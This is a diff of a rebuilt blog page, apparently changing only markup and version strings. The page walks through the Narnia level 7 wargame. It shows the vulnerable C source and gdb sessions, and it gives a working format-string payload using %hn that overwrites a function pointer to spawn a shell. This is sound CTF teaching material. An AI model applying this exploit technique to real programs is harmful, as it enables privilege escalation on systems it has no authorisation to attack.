@@ -116,11 +116,11 @@ narnia7@narnia:/narnia$ ./narnia7 AAAA goodfunction() = 0x80486ff hackedfunction
 pointer, but you have to do it using a format string vulnerability there is no overflowing
 this time.</p>
 <p>Now Let&rsquo;s run the program see what it does.</p>
-<pre><code>narnia7@narnia:/narnia$ ./narnia7
+<pre tabindex="0"><code>narnia7@narnia:/narnia$ ./narnia7
 Usage: ./narnia7 &lt;buffer&gt;
 narnia7@narnia:/narnia$
 </code></pre><p>The program asks us for an input.</p>
-<pre><code>narnia7@narnia:/narnia$ ./narnia7 AAAA
+<pre tabindex="0"><code>narnia7@narnia:/narnia$ ./narnia7 AAAA
 goodfunction() = 0x80486ff
 hackedfunction() = 0x8048724
 
@@ -186,57 +186,57 @@ reflected which means we can not debug our input properly.</p>
 </span><span class="lnt">51
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
-</span><span class="cp"></span>
-<span class="kt">int</span> <span class="nf">goodfunction</span><span class="p">();</span>
-<span class="kt">int</span> <span class="nf">hackedfunction</span><span class="p">();</span>
-
-<span class="kt">int</span> <span class="nf">vuln</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">){</span>
-        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
-        <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ptrf</span><span class="p">)();</span>
-
-        <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;goodfunction() = %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">goodfunction</span><span class="p">);</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;hackedfunction() = %p</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">hackedfunction</span><span class="p">);</span>
-
-        <span class="n">ptrf</span> <span class="o">=</span> <span class="n">goodfunction</span><span class="p">;</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;before : ptrf() = %p (%p)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ptrf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ptrf</span><span class="p">);</span>
-
-        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;I guess you want to come to the hackedfunction...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-        <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
-        <span class="n">ptrf</span> <span class="o">=</span> <span class="n">goodfunction</span><span class="p">;</span>
-
-        <span class="n">snprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">format</span><span class="p">);</span>
-
-        <span class="k">return</span> <span class="n">ptrf</span><span class="p">();</span>
-<span class="p">}</span>
-
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
-        <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;=</span> <span class="mi">1</span><span class="p">){</span>
-            <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Usage: %s &lt;buffer&gt;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
-            <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
-        <span class="p">}</span>
-        <span class="n">exit</span><span class="p">(</span><span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
-<span class="p">}</span>
-
-<span class="kt">int</span> <span class="nf">goodfunction</span><span class="p">(){</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Welcome to the goodfunction, but i said the Hackedfunction..</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-        <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
-
-        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="kt">int</span> <span class="nf">hackedfunction</span><span class="p">(){</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Way to go!!!!&#34;</span><span class="p">);</span>
-        <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
-        <span class="n">setreuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span><span class="n">geteuid</span><span class="p">());</span>
-        <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
-
-        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">goodfunction</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">hackedfunction</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">vuln</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ptrf</span><span class="p">)();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;goodfunction() = %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">goodfunction</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;hackedfunction() = %p</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">hackedfunction</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">ptrf</span> <span class="o">=</span> <span class="n">goodfunction</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;before : ptrf() = %p (%p)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ptrf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ptrf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;I guess you want to come to the hackedfunction...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ptrf</span> <span class="o">=</span> <span class="n">goodfunction</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">snprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">format</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">ptrf</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;=</span> <span class="mi">1</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Usage: %s &lt;buffer&gt;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">(</span><span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">goodfunction</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Welcome to the goodfunction, but i said the Hackedfunction..</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">hackedfunction</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Way to go!!!!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">setreuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span><span class="n">geteuid</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div>
 <h2 id="analysis">Analysis</h2>
@@ -254,7 +254,7 @@ have to use <code>gdb</code> to debug the program.</p>
 ever the <code>%s</code> format parameter can find, and if it finds my input it will try to dereference
 <code>0x41414141</code> which I think is not a valid address and the program will crash.</p>
 <p>First try</p>
-<pre><code>narnia7@narnia:/narnia$ ./narnia7 &quot;AAAA%s&quot;
+<pre tabindex="0"><code>narnia7@narnia:/narnia$ ./narnia7 &#34;AAAA%s&#34;
 goodfunction() = 0x80486ff
 hackedfunction() = 0x8048724
 
@@ -263,7 +263,7 @@ I guess you want to come to the hackedfunction...
 Welcome to the goodfunction, but i said the Hackedfunction..
 narnia7@narnia:/narnia$
 </code></pre><p>The program didn&rsquo;t crash second try.</p>
-<pre><code>narnia7@narnia:/narnia$ ./narnia7 &quot;AAAA%x%s&quot;
+<pre tabindex="0"><code>narnia7@narnia:/narnia$ ./narnia7 &#34;AAAA%x%s&#34;
 goodfunction() = 0x80486ff
 hackedfunction() = 0x8048724
 
@@ -277,7 +277,7 @@ to read from. We can confirm this with <code>gdb</code>.</p>
 the program crash.</p>
 <p>Fist let&rsquo;s set a break point after the <code>snprintf</code> function and inspect the stack. I will
 also run the program without any format parameters in the beginning to get the address of <code>ptrf</code>.</p>
-<pre><code>(gdb) run AAAA
+<pre tabindex="0"><code>(gdb) run AAAA
 Starting program: /narnia/narnia7 AAAA
 goodfunction() = 0x80486ff
 hackedfunction() = 0x8048724
@@ -287,10 +287,10 @@ I guess you want to come to the hackedfunction...
 
 Breakpoint 1, 0x080486b2 in vuln ()
 </code></pre><p>Now that we have the address of <code>ptrf</code> let&rsquo;s try to overwrite.</p>
-<pre><code>(gdb) run &quot;$(echo -en &quot;\xf8\xd5\xff\xff&quot;)%08x%n&quot;
+<pre tabindex="0"><code>(gdb) run &#34;$(echo -en &#34;\xf8\xd5\xff\xff&#34;)%08x%n&#34;
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
-Starting program: /narnia/narnia7 &quot;$(echo -en &quot;\xf8\xd5\xff\xff&quot;)%08x%n&quot;
+Starting program: /narnia/narnia7 &#34;$(echo -en &#34;\xf8\xd5\xff\xff&#34;)%08x%n&#34;
 goodfunction() = 0x80486ff
 hackedfunction() = 0x8048724
 
@@ -301,7 +301,7 @@ Breakpoint 1, 0x080486b2 in vuln ()
 (gdb) x/wx 0xffffd5f8
 0xffffd5f8:     0x0000000c
 </code></pre><p>Yes overwritten and if we try to continue the execution we get a segfult.</p>
-<pre><code>(gdb) c
+<pre tabindex="0"><code>(gdb) c
 Continuing.
 
 Program received signal SIGSEGV, Segmentation fault.
@@ -341,36 +341,36 @@ there are length modifiers which can specify how much bytes to write. From the m
 </span><span class="lnt">23
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-md" data-lang="md">...
-Length modifier
-   Here, &#34;integer conversion&#34; stands for d, i, o, u, x, or X conversion.
-
-   hh     A following integer conversion corresponds to a signed char or unsigned char ar‐
-          gument,  or  a  following n conversion corresponds to a pointer to a signed char
-          argument.
-
-   h      A following integer conversion corresponds to a short or  unsigned  short  argu‐
-          ment, or a following n conversion corresponds to a pointer to a short argument.
-
-   l      (ell)  A following integer conversion corresponds to a long or unsigned long ar‐
-          gument, or a following n conversion corresponds to a pointer to a long argument,
-          or  a  following c conversion corresponds to a wint_t argument, or a following s
-          conversion corresponds to a pointer to wchar_t argument.
-
-   ll     (ell-ell).  A following integer conversion corresponds to a  long  long  or  un‐
-          signed  long long argument, or a following n conversion corresponds to a pointer
-          to a long long argument.
-
-   q      A synonym for ll.  This is a nonstandard extension, derived from BSD; avoid  its
-          use in new code.
-...
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-md" data-lang="md"><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">Length modifier
+</span></span><span class="line"><span class="cl">   Here, &#34;integer conversion&#34; stands for d, i, o, u, x, or X conversion.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   hh     A following integer conversion corresponds to a signed char or unsigned char ar‐
+</span></span><span class="line"><span class="cl">          gument,  or  a  following n conversion corresponds to a pointer to a signed char
+</span></span><span class="line"><span class="cl">          argument.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   h      A following integer conversion corresponds to a short or  unsigned  short  argu‐
+</span></span><span class="line"><span class="cl">          ment, or a following n conversion corresponds to a pointer to a short argument.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   l      (ell)  A following integer conversion corresponds to a long or unsigned long ar‐
+</span></span><span class="line"><span class="cl">          gument, or a following n conversion corresponds to a pointer to a long argument,
+</span></span><span class="line"><span class="cl">          or  a  following c conversion corresponds to a wint_t argument, or a following s
+</span></span><span class="line"><span class="cl">          conversion corresponds to a pointer to wchar_t argument.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   ll     (ell-ell).  A following integer conversion corresponds to a  long  long  or  un‐
+</span></span><span class="line"><span class="cl">          signed  long long argument, or a following n conversion corresponds to a pointer
+</span></span><span class="line"><span class="cl">          to a long long argument.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   q      A synonym for ll.  This is a nonstandard extension, derived from BSD; avoid  its
+</span></span><span class="line"><span class="cl">          use in new code.
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>We are going to use <code>h</code> which states that the integer conversion will be <code>short</code> or <code>unsigned short</code>
 and a <code>short</code> is 2-bytes, it actually depends on each system but in our case it&rsquo;s 2-bytes.
 Let&rsquo;s test it out.</p>
-<pre><code>(gdb) run $(echo -en &quot;\x28\xd6\xff\xff&quot;)%08x%hn
-Starting program: /narnia/narnia7 $(echo -en &quot;\x28\xd6\xff\xff&quot;)%08x%hn
+<pre tabindex="0"><code>(gdb) run $(echo -en &#34;\x28\xd6\xff\xff&#34;)%08x%hn
+Starting program: /narnia/narnia7 $(echo -en &#34;\x28\xd6\xff\xff&#34;)%08x%hn
 goodfunction() = 0x80486ff
 hackedfunction() = 0x8048724
 
@@ -388,8 +388,8 @@ half to be <code>0x8724</code> which is <code>34596</code> in decimal, but we ha
 means we have to account for it by subtracting it <code>0x8724 - 0x000c</code> we also have to add
 <code>8</code> in decimal because of the <code>%08</code>, and finally we have <code>0x8724 - 0x000c + 8 = 34592</code> . Let&rsquo;s
 try it out.</p>
-<pre><code>(gdb) run $(echo -en &quot;\x18\xd6\xff\xff&quot;)%34592x%hn
-Starting program: /narnia/narnia7 $(echo -en &quot;\x18\xd6\xff\xff&quot;)%34592x%hn
+<pre tabindex="0"><code>(gdb) run $(echo -en &#34;\x18\xd6\xff\xff&#34;)%34592x%hn
+Starting program: /narnia/narnia7 $(echo -en &#34;\x18\xd6\xff\xff&#34;)%34592x%hn
 goodfunction() = 0x80486ff
 hackedfunction() = 0x8048724
 
@@ -398,16 +398,16 @@ I guess you want to come to the hackedfunction...
 
 Breakpoint 1, 0x080486b2 in vuln ()
 </code></pre><p>Seems like it worked let&rsquo;s examine what&rsquo;s on <code>ptrf</code></p>
-<pre><code>(gdb) x/wx 0xffffd618
+<pre tabindex="0"><code>(gdb) x/wx 0xffffd618
 0xffffd618:     0x08048724
 </code></pre><p>The address of <code>hackedfunction</code> has been written successfully. If we continue the execution
 we should get a shell and indeed we get a shell.</p>
-<pre><code>(gdb) c
+<pre tabindex="0"><code>(gdb) c
 Continuing.
 Way to go!!!!$
 $
 </code></pre><p>Now let&rsquo;s try it outside of <code>gdb</code>.</p>
-<pre><code>narnia7@narnia:/narnia$ ./narnia7 $(echo -en &quot;\x58\xd6\xff\xff&quot;)%34592x%hn
+<pre tabindex="0"><code>narnia7@narnia:/narnia$ ./narnia7 $(echo -en &#34;\x58\xd6\xff\xff&#34;)%34592x%hn
 goodfunction() = 0x80486ff
 hackedfunction() = 0x8048724
 
@@ -448,8 +448,8 @@ I just changed the address and it worked.</p>
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.87.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
-                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Omer</a></span></div>
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.96.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Omer</a></span></div>
         </div>
     </footer></div>
 
@@ -458,5 +458,5 @@ I just changed the address and it worked.</p>
             </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                 <i class="fas fa-comment fa-fw"></i>
             </a>
-        </div><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+        </div><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
 </html>
